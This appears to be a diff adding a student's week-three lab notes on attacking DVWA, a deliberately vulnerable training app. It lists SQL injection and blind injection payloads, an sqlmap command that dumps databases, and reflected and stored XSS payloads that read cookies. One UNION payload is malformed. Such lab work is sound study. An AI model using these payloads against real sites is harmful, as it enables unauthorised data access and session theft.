@@ -1,0 +1,20 @@
+			WEEK 3
+Payloads:
+
+1-> For SQL INJECTION
+' OR "1" = "1" '
+' UNION SELECT FROM user, password FROM users#
+
+2-> For BLIND SQL INJECTION
+1' and length(database())=4#
+
+3-> For SQL map in dvwa Database:
+sqlmap -u'http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie="PHPSESSID=[607b41b53e91d4552c0c080533abf331];security=low" –-dbs
+
+4-> For Cross Site Scripting
+*Reflected XSS:
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(document.cookie)/> 
+*Stored XSS:
+--I used the name john in the name input and in Message field I used <img src=x onerror=alert(document.cookie)/> and this script is store in the database and when anyone try to access that page this script is run automatically on the user browser and show the user cookie.
+--As I try the Higih Security and then I try the XXS but the webpage convert the tags and this is not working.As when I try <svg onload=alert(document.cookie)></svg> this convert into &lt;svg onload=alert(document.cookie)&gt;&lt;/svg&gt;
